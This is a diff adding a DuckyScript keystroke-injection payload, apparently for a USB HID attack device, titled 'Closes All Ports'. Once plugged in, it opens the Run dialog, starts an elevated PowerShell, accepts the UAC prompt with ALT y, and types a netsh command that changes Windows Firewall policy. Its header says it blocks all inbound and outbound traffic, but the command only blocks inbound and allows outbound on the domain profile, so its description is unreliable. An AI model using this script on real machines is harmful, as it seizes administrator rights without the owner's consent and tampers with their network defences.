@@ -1,0 +1,15 @@
+REM Title: Closes All Ports
+REM Author: Sorted#0002
+REM Description: This Blocks All Incoming And Outgoing Traffic On Windows Firewall
+
+
+DELAY 750
+GUI r
+DELAY 900
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 900
+ALT y
+DELAY 900
+STRING netsh advfirewall set domainprofile firewallpolicy blockinbound,allowoutbound
+ENTER
